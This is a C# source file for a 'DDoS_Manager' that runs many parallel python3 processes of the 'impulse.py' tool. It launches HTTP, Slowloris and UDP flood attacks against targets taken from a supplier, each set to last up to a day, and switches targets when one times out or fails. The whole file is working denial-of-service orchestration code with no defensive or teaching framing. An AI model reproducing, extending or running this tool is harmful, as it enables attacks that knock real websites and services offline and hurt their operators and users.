using System.Diagnostics;
using ConcurrentCollections;

namespace DDoS_Manager;

public class AttackTaskManager
{
    private readonly int _semaphoreNumber;
    private readonly List<Task> _tasks;
    private readonly TargetSupplier _targetSupplier;
    private readonly ConcurrentHashSet<Process> _activeProcesses;
    private readonly Mutex _mutex;
    private readonly Semaphore _semaphore;
    private const int MinutesUpperLimit = 30;

    public AttackTaskManager(int maxTasksNumber, TargetSupplier targetSupplier)
    {
        _semaphoreNumber = maxTasksNumber;
        _tasks = new List<Task>(_semaphoreNumber);
        _targetSupplier = targetSupplier;
        _activeProcesses = new ConcurrentHashSet<Process>();
        _mutex = new Mutex();
        _semaphore = new Semaphore(maxTasksNumber, short.MaxValue);
    }

    public void InitializeAttack()
    {
        var attackTasksManager = new Task(AttackTaskManageMethod);
        attackTasksManager.Start();
        attackTasksManager.Wait();
    }

    private void AttackTaskManageMethod()
    {
        // Create initial number of tasks
        for (var i = 0; i < _semaphoreNumber; i++)
        {
            _tasks.Add(new Task(AttackMethod));
            _tasks[i].Start();
        }

        foreach (var task in _tasks)
        {
            task.Wait();
        }
    }

    private void AttackMethod()
    {
        var localSemaphore = new Semaphore(0, short.MaxValue);
        string? data = null;
        while (true)
        {
            _semaphore.WaitOne();
            _mutex.WaitOne();
            var (target, method) = _targetSupplier.GetNextTarget();
            _mutex.ReleaseMutex();
            
            var externalProcess = new Process();
            _activeProcesses.Add(externalProcess);
            externalProcess.StartInfo.FileName = "python3";
            externalProcess.StartInfo.WorkingDirectory = "resources";
            externalProcess.StartInfo.RedirectStandardOutput = true;
            externalProcess.StartInfo.UseShellExecute = false;
            externalProcess.OutputDataReceived += (_, args) =>
            {
                if (args.Data == null)
                {
                    return;
                }
                data = args.Data;
                localSemaphore.Release();
            };
            externalProcess.StartInfo.Arguments = 
                "impulse.py --threads 1 --time 86400 --method " + method + " --target " + target;
            externalProcess.Start();
            var startUtcTime = DateTime.UtcNow;
            
            AttackLifecycle(localSemaphore, data, method, startUtcTime, externalProcess);
        }
    }

    private void AttackLifecycle(WaitHandle localSemaphore, string? data, string method, DateTime startUtcTime,
        Process externalProcess)
    {
        while (true)
        {
            localSemaphore.WaitOne();
            Debug.Assert(data != null);
            Console.WriteLine(data);
            if (!data.Contains("Timed out"))
            {
                continue;
            }

            switch (method)
            {
                case "HTTP" when !data.Contains("Error"):
                case "Slowloris" when !data.Contains("Failed"):
                case "UDP" when (DateTime.UtcNow - startUtcTime).Minutes > MinutesUpperLimit:
                    continue;
            }

            Console.WriteLine("Changing targets...");
            externalProcess.Kill();
            while (true) // Busy waiting removal
            {
                var isRemoved = _activeProcesses.TryRemove(externalProcess);
                if (isRemoved)
                {
                    break;
                }
            }

            externalProcess.Close();
            _semaphore.Release();
            break;
        }
    }

    public void TerminateAttack()
    {
        foreach (var process in _activeProcesses)
        {
            process.Kill();
            process.Close();
        }
    }
}